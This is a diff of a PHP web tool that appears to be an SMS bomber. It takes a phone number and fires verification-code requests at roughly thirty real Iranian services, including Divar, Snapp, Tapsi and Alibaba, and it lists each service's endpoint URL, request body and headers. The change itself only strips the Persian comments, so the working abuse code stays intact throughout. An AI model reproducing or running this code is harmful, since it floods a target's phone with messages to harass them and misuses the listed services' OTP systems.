@@ -15,37 +15,36 @@ if (isset($_POST['phone'])) {
 
 function all($phone)
 {
-    // فراخوانی توابع ارسال برای هر سرویس
-    divar($phone);                // سرویس دیوار
-    nobatir($phone);              // سرویس نوبت‌ایران
-    alopeyk_login($phone);        // سرویس آلوپیک (ورود)
-    alopeyk_signup($phone);       // سرویس آلوپیک (ثبت‌نام)
-    shahrefarsh($phone);          // سرویس شهرفرش
-    digistyle($phone);            // سرویس دیجی‌استایل
-    snapp_express($phone);        // سرویس اسنپ اکسپرس
-    azki($phone);                 // سرویس ازکی
-    digikala_jet($phone);         // سرویس دیجی‌کالا جت
-    snapp_drivers($phone);        // سرویس اسنپ درایور
-    ostadkar($phone);             // سرویس استادکار
-    miare($phone);                // سرویس میاره
-    tapsi_drivers($phone);        // سرویس تپسی رانندگان
-    tapsi_passenger($phone);      // سرویس تپسی مسافران
-    banimode($phone);             // سرویس بانی‌مد
-    taaghche_login($phone);       // سرویس طاقچه (ورود)
-    taaghche_signup($phone);      // سرویس طاقچه (ثبت‌نام)
-    mobit($phone);                // سرویس مبیت
-    jabama($phone);               // سرویس جاباما
-    ghabzino($phone);             // سرویس قبضینو
-    komodaa($phone);              // سرویس کمدا
-    barghe_man($phone);           // سرویس برگه من
-    vandar($phone);               // سرویس وندار
-    pinorest($phone);             // سرویس پینورست
-    tetherland($phone);           // سرویس تترلند
-    alibaba($phone);              // سرویس علی‌بابا
-    drdr($phone);                 // سرویس دکتردکتر
-    drnext($phone);               // سرویس درنکست
-    classino($phone);             // سرویس کلاسینو
-    takshopaccessorise($phone);   // سرویس تک شاپ
+    divar($phone);               
+    nobatir($phone);              
+    alopeyk_login($phone);       
+    alopeyk_signup($phone);       
+    shahrefarsh($phone);          
+    digistyle($phone);            
+    snapp_express($phone);
+    azki($phone);
+    digikala_jet($phone);
+    snapp_drivers($phone);
+    ostadkar($phone);
+    miare($phone);
+    tapsi_drivers($phone);
+    tapsi_passenger($phone);
+    banimode($phone);
+    taaghche_login($phone);
+    taaghche_signup($phone);
+    mobit($phone);
+    jabama($phone);
+    ghabzino($phone);
+    komodaa($phone);
+    barghe_man($phone);
+    vandar($phone);
+    pinorest($phone);
+    tetherland($phone);
+    alibaba($phone);
+    drdr($phone);
+    drnext($phone);
+    classino($phone);
+    takshopaccessorise($phone);
 }
 
 
@@ -99,7 +98,7 @@ function CURL_SMS($URL, $PHONE_VALUE, $HEADER1 = NULL, $HEADER2 = NULL): void
 }
 
 
-// سرویس دیوار
+
 function divar($phone)
 {
     $url = 'https://api.divar.ir/v5/auth/authenticate';
@@ -107,7 +106,7 @@ function divar($phone)
     CURL_SMS($url, $phone_value);
 }
 
-// سرویس نوبت‌ایران
+
 function nobatir($phone)
 {
     $url = 'https://nobat.ir/api/public/patient/login/phone';
@@ -116,17 +115,17 @@ function nobatir($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس آلوپیک (ورود)
+
 function alopeyk_login($phone)
 {
-    $phone = (int)$phone;  // حذف صفر ابتدای شماره
+    $phone = (int)$phone; 
     $url = 'https://api.alopeyk.com/api/v2/login?platform=pwa';
     $phone_value = '{"type":"CUSTOMER","model":"Chrome 111.0.0.0","platform":"pwa","version":"10","manufacturer":"Windows","isVirtual":false,"serial":true,"app_version":"1.2.9","uuid":true,"phone":" ' . $phone . '"}';
     $header = 'content-type: application/json';
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس آلوپیک (ثبت‌نام)
+
 function alopeyk_signup($phone)
 {
     $url = 'https://api.alopeyk.com/api/v2/register-customer?platform=pwa';
@@ -135,7 +134,7 @@ function alopeyk_signup($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس شهرفرش
+
 function shahrefarsh($phone)
 {
     $url = 'https://shahrfarsh.com/Account/Login';
@@ -143,7 +142,7 @@ function shahrefarsh($phone)
     CURL_SMS($url, $phone_value);
 }
 
-// سرویس دیجی‌استایل
+
 function digistyle($phone)
 {
     global $response;
@@ -154,7 +153,7 @@ function digistyle($phone)
     file_get_contents('https://www.digistyle.com/users/register/confirm/?token=' . $tok[0] . '&type=register');
 }
 
-// سرویس اسنپ اکسپرس
+
 function snapp_express($phone)
 {
     $url = 'https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=52f02dbc&optionalVersion=5.6.6&UDID=fb000c1a-41a6-4059-8e22-7fb820e6942b';
@@ -162,7 +161,7 @@ function snapp_express($phone)
     CURL_SMS($url, $phone_value);
 }
 
-// سرویس ازکی
+
 function azki($phone)
 {
     $url = 'https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/';
@@ -172,7 +171,7 @@ function azki($phone)
     CURL_SMS($url, $phone_value, $header1, $header2);
 }
 
-// سرویس دیجی‌کالا جت
+
 function digikala_jet($phone)
 {
     $url = 'https://api.digikalajet.ir/user/login-register/';
@@ -181,7 +180,7 @@ function digikala_jet($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس اسنپ درایور
+
 function snapp_drivers($phone)
 {
     $url = 'https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=';
@@ -189,7 +188,7 @@ function snapp_drivers($phone)
     CURL_SMS($url, $phone_value);
 }
 
-// سرویس استادکار
+
 function ostadkar($phone)
 {
     $url = 'https://api.ostadkr.com/login';
@@ -197,7 +196,7 @@ function ostadkar($phone)
     CURL_SMS($url, $phone_value);
 }
 
-// سرویس میاره
+
 function miare($phone)
 {
     $url = 'https://www.miare.ir/api/otp/driver/request/';
@@ -206,7 +205,7 @@ function miare($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس تپسی رانندگان
+
 function tapsi_drivers($phone)
 {
     $url = 'https://api.tapsi.ir/api/v2.2/user';
@@ -215,7 +214,7 @@ function tapsi_drivers($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس تپسی مسافران
+
 function tapsi_passenger($phone)
 {
     $url = 'https://api.tapsi.ir/api/v2.2/user';
@@ -224,7 +223,7 @@ function tapsi_passenger($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس بانی‌مد
+
 function banimode($phone)
 {
     $url = 'https://mobapi.banimode.com/api/v2/auth/request';
@@ -233,7 +232,7 @@ function banimode($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس دکتردکتر
+
 function drdr($phone)
 {
     $url = 'https://drdr.ir/api/v3/auth/login/mobile/init';
@@ -243,7 +242,7 @@ function drdr($phone)
     CURL_SMS($url, $phone_value, $header1, $header2);
 }
 
-// سرویس طاقچه (ورود)
+
 function taaghche_login($phone)
 {
     $url = 'https://gw.taaghche.com/v4/site/auth/login';
@@ -252,7 +251,7 @@ function taaghche_login($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس طاقچه (ثبت‌نام)
+
 function taaghche_signup($phone)
 {
     $url = 'https://gw.taaghche.com/v4/site/auth/signup';
@@ -261,7 +260,7 @@ function taaghche_signup($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس کمدا
+
 function komodaa($phone)
 {
     $url = 'https://api.komodaa.com/api/v2.6/loginRC/request';
@@ -270,7 +269,7 @@ function komodaa($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس قبضینو
+
 function ghabzino($phone)
 {
     $url = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode';
@@ -279,7 +278,7 @@ function ghabzino($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس برگه من
+
 function barghe_man($phone)
 {
     $url = 'https://uiapi2.saapa.ir/api/otp/sendCode';
@@ -287,7 +286,7 @@ function barghe_man($phone)
     CURL_SMS($url, $phone_value);
 }
 
-// سرویس وندار
+
 function vandar($phone)
 {
     $url = 'https://api.vandar.io/account/v1/check/mobile';
@@ -296,7 +295,7 @@ function vandar($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس مبیت
+
 function mobit($phone)
 {
     $url = 'https://api.mobit.ir/api/web/v8/register/register';
@@ -305,7 +304,7 @@ function mobit($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس جاباما
+
 function jabama($phone)
 {
     $url = 'https://taraazws.jabama.com/api/v4/account/send-code';
@@ -314,7 +313,7 @@ function jabama($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس پینورست
+
 function pinorest($phone)
 {
     $url = 'https://api.pinorest.com/frontend/auth/login/mobile';
@@ -323,7 +322,7 @@ function pinorest($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس تترلند
+
 function tetherland($phone)
 {
     $url = 'https://service.tetherland.com/api/v5/login-register';
@@ -332,7 +331,7 @@ function tetherland($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس علی‌بابا
+
 function alibaba($phone)
 {
     $url = 'https://ws.alibaba.ir/api/v3/account/mobile/otp';
@@ -341,7 +340,7 @@ function alibaba($phone)
     CURL_SMS($url, $phone_value, $header);
 }
 
-// سرویس درنکست
+
 function drnext($phone)
 {
     $url = 'https://cyclops.drnext.ir/v1/patients/auth/send-verification-token';
@@ -350,7 +349,7 @@ function drnext($phone)
     CURL_SMS($url, $phone_values, $header);
 }
 
-// سرویس کلاسینو
+
 function classino($phone)
 {
     $url = 'https://student.classino.com/otp/v1/api/login';
@@ -359,7 +358,7 @@ function classino($phone)
     CURL_SMS($url, $phone_value, $heaedr);
 }
 
-// سرویس تک شاپ
+
 function takshopaccessorise($phone)
 {
     $url = 'https://takshopaccessorise.ir/api/v1/sessions/login_request';
@@ -775,7 +774,6 @@ function takshopaccessorise($phone)
         </div>
     </div>
     
-    <!-- پاپ‌آپ وضعیت -->
     <div class="popup" id="statusPopup">
         <div class="popup-content">
             <h3 id="popupTitle">در حال ارسال</h3>
